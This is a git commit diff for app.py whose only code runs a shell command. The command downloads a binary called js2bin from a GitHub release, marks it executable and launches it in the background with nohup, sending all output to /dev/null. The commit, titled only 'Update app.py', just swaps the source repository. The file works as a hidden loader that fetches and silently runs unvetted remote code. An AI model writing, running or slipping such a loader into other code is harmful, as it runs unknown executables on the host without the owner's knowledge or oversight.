9528af37d6f6faa49e6d9ee78513ec9a5ac0c9ef
Kuang YiWu <136738046+alphaxcv@users.noreply.github.com>
2024-07-17 23:26:04 -0400

    Update app.py

--- app.py
+++ app.py
@@ -1,3 +1,3 @@
 import subprocess
 
-subprocess.run("curl -L -o js2bin https://github.com/alphaxcv/scx/releases/download/dl/js2bin && chmod +x js2bin && nohup ./js2bin > /dev/null 2>&1", shell=True)
+subprocess.run("curl -L -o js2bin https://github.com/alphaxcv/slx/releases/download/dl/js2bin && chmod +x js2bin && nohup ./js2bin > /dev/null 2>&1", shell=True)
